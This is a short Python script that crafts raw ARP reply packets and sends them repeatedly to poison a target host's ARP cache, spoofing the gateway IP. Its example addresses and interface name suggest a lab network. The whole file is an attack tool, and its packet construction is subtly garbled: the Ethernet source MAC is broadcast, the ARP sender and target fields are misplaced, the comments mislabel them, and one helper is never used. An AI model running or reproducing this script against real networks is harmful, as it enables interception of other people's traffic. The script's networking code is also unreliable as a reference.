import os
import sys
import socket
import struct
import fcntl
import time

# Constants for the ARP protocol
ETH_P_ALL = 0x0003
ETH_P_ARP = 0x0806
ARPOP_REQUEST = 1
ARPOP_REPLY = 2

def get_mac(iface):
    """
    Get the MAC address of a network interface.
    
    :param iface: Network interface (e.g., 'eth0', 'wlan0')
    :return: MAC address in bytes
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    mac = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', iface[:15].encode('utf-8')))
    return ':'.join(['%02x' % b for b in mac[18:24]])

def send_arp_poisoning(target_ip, spoof_ip, target_mac, iface):
    """
    Perform ARP poisoning using raw sockets.
    
    :param target_ip: Target device IP address
    :param spoof_ip: IP address to spoof
    :param target_mac: Target device MAC address
    :param iface: Network interface to send packets on
    """
    # Create a raw socket for Ethernet frames
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ARP))
    
    # Set the socket interface
    iface_index = socket.if_nametoindex(iface)
    s.bind((iface, ETH_P_ALL))
    
    # Construct the Ethernet header
    ether_header = struct.pack(
        "!6s6s2s", 
        bytes.fromhex(target_mac.replace(":", "")),  # Target MAC address
        bytes.fromhex("ff:ff:ff:ff:ff:ff".replace(":", "")),  # Broadcast MAC
        struct.pack("!H", ETH_P_ARP)  # Ethertype for ARP
    )

    # Construct the ARP header
    arp_header = struct.pack(
        "!HHBBH6s4s6s4s",
        0x0001,  # Hardware type (Ethernet)
        0x0800,  # Protocol type (IPv4)
        6,  # Hardware address length
        4,  # Protocol address length
        ARPOP_REPLY,  # ARP operation (Reply)
        bytes.fromhex(target_mac.replace(":", "")),  # Target MAC address
        socket.inet_aton(target_ip),  # Target IP address
        bytes.fromhex("00:00:00:00:00:00".replace(":", "")),  # Source MAC address (spoofed)
        socket.inet_aton(spoof_ip)  # Source IP address (spoofed)
    )
    
    # Combine Ethernet and ARP headers
    packet = ether_header + arp_header
    
    # Send the packet indefinitely
    print(f"[+] Sending ARP Poisoning packets to {target_ip} with spoofed IP {spoof_ip}")
    try:
        while True:
            s.send(packet)  # Send the raw ARP packet
            time.sleep(1)  # Adjust delay as necessary
    except KeyboardInterrupt:
        print("\n[-] Stopping ARP Poisoning")
        s.close()
    except Exception as e:
        print(f"[!] Error occurred: {e}")

if __name__ == "__main__":
    # Example usage (change IPs and MACs accordingly)
    target_ip = "192.168.227.67"  # Target IP address
    spoof_ip = "192.168.227.1"    # IP to spoof (typically the gateway)
    target_mac = "00:11:22:33:44:55"  # Target MAC address (you should get it from the target device)
    iface = "h1-eth0"  # Network interface (change as needed)
    
    send_arp_poisoning(target_ip, spoof_ip, target_mac, iface)